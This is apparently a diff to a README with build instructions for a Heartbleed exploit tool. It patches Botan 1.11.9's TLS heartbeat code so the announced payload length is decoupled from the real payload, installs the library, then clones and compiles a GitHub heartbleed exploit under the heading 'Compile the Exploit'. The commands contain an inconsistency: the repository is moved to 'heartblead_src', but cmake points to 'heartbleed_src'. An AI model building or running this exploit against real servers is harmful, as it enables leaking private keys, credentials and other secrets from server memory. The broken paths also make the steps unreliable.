@@ -1,9 +1,10 @@
-# Botan
+# Changes in Botan
 tested version: 1.11.9
 
 download here: http://files.randombit.net/botan/Botan-1.11.9.tgz
 
 > tar xfvz Botan-1.11.9.tgz
+
 > cd Botan-1.11.9/
 
 apply the following changes (no patchfiles sorry)
@@ -27,19 +28,31 @@ apply the following changes (no patchfiles sorry)
 - replace
 
 > send_buf[1] = get_byte<u16bit>(0, m_payload.size());
+
 > send_buf[2] = get_byte<u16bit>(1, m_payload.size());
 
 with
 
 > send_buf[1] = get_byte<u16bit>(0, m_payload_len);
+
 > send_buf[2] = get_byte<u16bit>(1, m_payload_len);
 
 > ./configure --prefix=/your/install/prefix/here (in my case '/opt/heartbleed')
+
 > make
+
 > make install
+
+# Compile the Exploit
+
 > git clone https://github.com/DanielAW/heartbleed.git
+
 > mv heartbleed heartblead_src
+
 > mkdir heartbleed
+
 > cd heartbleed
+
 > cmake ../heartbleed_src
+
 > make
